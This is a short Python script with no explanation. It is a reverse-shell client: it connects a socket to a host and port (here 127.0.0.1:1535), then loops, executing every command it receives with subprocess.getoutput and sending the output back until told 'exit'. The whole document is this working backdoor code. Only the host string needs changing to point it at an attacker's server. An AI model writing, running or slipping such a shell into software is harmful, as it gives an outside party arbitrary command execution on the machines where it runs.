import socket
import subprocess as sp

host = "127.0.0.1"
port = 1535
soket = socket.socket()
soket.connect((host, port))
message = soket.recv(4096).decode()
print(message)
while True:
    command = soket.recv(4096).decode()
    if command.lower() == "exit":
        break
    output = sp.getoutput(command)
    soket.send(output.encode(encoding="utf8"))
soket.close()
